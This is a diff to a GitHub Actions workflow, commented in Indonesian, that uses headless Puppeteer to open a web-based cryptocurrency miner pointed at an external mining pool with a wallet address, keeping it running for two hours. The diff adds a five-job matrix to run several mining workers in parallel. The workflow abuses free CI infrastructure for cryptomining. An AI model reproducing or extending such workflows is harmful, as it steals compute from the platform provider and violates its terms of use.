@@ -8,6 +8,19 @@ jobs:
   run_puppeteer:
     runs-on: ubuntu-latest  # Gunakan sistem operasi Ubuntu terbaru
 
+    strategy:
+      matrix:
+        job1:
+          worker: 1
+        job2:
+          worker: 2
+        job3:
+          worker: 3
+        job4:
+          worker: 4
+        job5:
+          worker: 5
+
     steps:
       - name: Checkout repository
         uses: actions/checkout@v2
@@ -31,7 +44,7 @@ jobs:
               headless: true,
             });
             const page = await browser.newPage();
-            await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
+            await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=' + process.env.worker);
 
             // Set timeout untuk menjaga browser terbuka selama 2 jam (7200 detik)
             setTimeout(async () => {
